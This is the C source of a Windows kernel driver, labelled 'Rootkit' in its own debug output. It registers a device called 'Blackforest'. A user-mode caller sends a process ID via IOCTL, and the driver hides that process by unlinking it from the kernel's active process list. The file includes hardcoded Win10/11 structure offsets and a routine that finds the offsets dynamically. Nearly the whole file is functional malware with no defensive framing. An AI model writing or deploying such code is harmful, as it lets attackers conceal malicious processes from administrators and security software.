#include "driver/mini_ntddk.h"

// Win10/11 x64 Defaults (Fallback)
ULONG ACTIVE_PROCESS_LINKS_OFFSET = 0x448;
ULONG UNIQUE_PROCESS_ID_OFFSET = 0x440;

// Protocols are in mini_ntddk.h
NTSTATUS NTAPI KmDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS NTAPI KmCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
void NTAPI KmUnload(PDRIVER_OBJECT DriverObject);

void HideProcessDKOM(ULONG targetPid) {
    PEPROCESS StartProcess = NULL;
    if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)4, &StartProcess))) {
         DbgPrint("[Rootkit] Failed to get System Process\n");
         return;
    }

    PLIST_ENTRY CurrentListEntry = (PLIST_ENTRY)((ULONG_PTR)StartProcess + ACTIVE_PROCESS_LINKS_OFFSET);
    PLIST_ENTRY NextListEntry = NULL;
    PLIST_ENTRY PrevListEntry = NULL;

    // Head of list
    PLIST_ENTRY Head = CurrentListEntry;

    do {
        PEPROCESS CurrentProcess = (PEPROCESS)((ULONG_PTR)CurrentListEntry - ACTIVE_PROCESS_LINKS_OFFSET);
        ULONG pid = *(ULONG*)((ULONG_PTR)CurrentProcess + UNIQUE_PROCESS_ID_OFFSET);

        if (pid == targetPid) {
            DbgPrint("[Rootkit] Found Target PID: %d. Unlinking...\n", pid);
            
            PrevListEntry = CurrentListEntry->Blink;
            NextListEntry = CurrentListEntry->Flink;
            
            PrevListEntry->Flink = NextListEntry;
            NextListEntry->Blink = PrevListEntry;
            
            CurrentListEntry->Flink = CurrentListEntry;
            CurrentListEntry->Blink = CurrentListEntry;
            
            break;
        }
        CurrentListEntry = CurrentListEntry->Flink;
    } while (CurrentListEntry != Head);

    ObDereferenceObject(StartProcess);
}

NTSTATUS KmDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = (PIO_STACK_LOCATION)Irp->CurrentStackLocation;
    ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;
    NTSTATUS status = STATUS_SUCCESS;
    
    if (controlCode == IOCTL_HIDE_PROCESS) {
        ULONG pid = *(ULONG*)Irp->AssociatedIrp.SystemBuffer;
        HideProcessDKOM(pid);
    }
    
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS KmCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

void KmUnload(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, L"\\DosDevices\\Blackforest");
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
    DbgPrint("[Rootkit] Unloaded.\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNICODE_STRING devName, symLink;
    PDEVICE_OBJECT DeviceObject;
    NTSTATUS status;
    
    // Dynamic Offset Finding
    PEPROCESS SysProc;
    if(NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)4, &SysProc))) {
        for(int i = 0x100; i < 0x1000; i += 8) {
             ULONG_PTR check = *(ULONG_PTR*)((ULONG_PTR)SysProc + i);
             if(check == 4) { 
                 UNIQUE_PROCESS_ID_OFFSET = i;
                 ACTIVE_PROCESS_LINKS_OFFSET = i + 8;
                 DbgPrint("[Rootkit] Dynamic Offsets Found: PID=0x%x, Links=0x%x\n", UNIQUE_PROCESS_ID_OFFSET, ACTIVE_PROCESS_LINKS_OFFSET);
                 break;
             }
        }
        ObDereferenceObject(SysProc);
    }
    
    RtlInitUnicodeString(&devName, L"\\Device\\Blackforest");
    RtlInitUnicodeString(&symLink, L"\\DosDevices\\Blackforest");
    
    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
    if (!NT_SUCCESS(status)) return status;
    
    IoCreateSymbolicLink(&symLink, &devName);
    
    DriverObject->MajorFunction[IRP_MJ_CREATE] = KmCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = KmCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KmDeviceControl;
    DriverObject->DriverUnload = KmUnload;
    
    DbgPrint("[Rootkit] DriverEntry Success.\n");
    return STATUS_SUCCESS;
}
